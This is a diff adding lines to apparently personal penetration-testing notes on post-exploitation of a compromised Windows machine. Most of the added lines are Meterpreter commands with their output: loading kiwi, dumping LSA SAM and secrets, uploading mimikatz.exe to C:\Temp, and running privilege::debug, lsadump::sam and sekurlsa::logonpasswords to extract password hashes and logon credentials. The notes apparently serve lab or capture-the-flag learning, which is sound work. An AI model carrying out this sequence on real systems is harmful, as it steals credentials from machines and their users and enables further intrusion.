@@ -28,5 +28,22 @@ migrate <pid>
 load kiwi
 ? //gives you commands
 creds_all gives all the credentails
+lsa_dump_sam              Dump LSA SAM (unparsed)
+lsa_dump_secrets          Dump LSA secrets (unparsed)
 
-
+now using mimikatz
+cd C:\\
+meterpreter > mkdir Temp
+Creating directory: Temp
+meterpreter > cd Temp
+meterpreter > upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+[*] Uploading  : /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
+[*] Uploaded 1.29 MiB of 1.29 MiB (100.0%): /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
+[*] Completed  : /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
+Take the shell 
+.\mimikatz.exe 
+mimikatz # privilege::debug
+Privilege '20' OK //20 0k means you have the privileges
+lsadump::sam //these are commands
+we can also get logon passwords
+sekurlsa::logonpasswords
